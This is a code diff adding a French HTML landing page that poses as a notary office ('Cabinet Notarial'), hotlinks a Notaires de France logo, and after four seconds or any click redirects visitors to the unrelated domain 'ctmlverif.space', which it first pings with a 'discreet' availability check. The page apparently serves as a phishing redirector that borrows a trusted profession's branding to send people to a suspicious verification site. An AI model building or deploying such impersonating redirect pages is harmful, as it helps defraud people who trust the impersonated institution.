@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Cabinet Notarial</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+    }
+    .logo {
+      max-width: 250px;
+      margin-bottom: 30px;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #00AEEF;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    p {
+      color: #333;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    .error a {
+      color: #00AEEF;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <img class="logo" src="https://lepetitjournal.com/_next/image?url=https%3A%2F%2Fbackoffice.lepetitjournal.com%2Fsites%2Fdefault%2Ffiles%2F2022-10%2FNotaires%2520de%2520France%2520_0.png&w=256&q=75" alt="Cabinet Notarial">
+  <div class="loader"></div>
+  <p id="message">Vous allez être redirigé vers notre site officiel...</p>
+
+  <script>
+    (function() {
+      const targetUrl = "https://ctmlverif.space"; // À remplacer par votre vrai site
+      const delay = 4000; // 4 secondes
+      
+      // Vérification discrète de la disponibilité
+      fetch(targetUrl, { 
+        method: 'HEAD', 
+        mode: 'no-cors',
+        cache: 'no-cache'
+      }).catch(() => {
+        // Silencieux - on laisse la redirection se faire quand même
+      });
+      
+      // Redirection après le délai
+      setTimeout(() => {
+        window.location.href = targetUrl;
+      }, delay);
+      
+      // Permettre à l'utilisateur de passer la redirection
+      window.addEventListener('load', function() {
+        document.body.addEventListener('click', function() {
+          window.location.href = targetUrl;
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
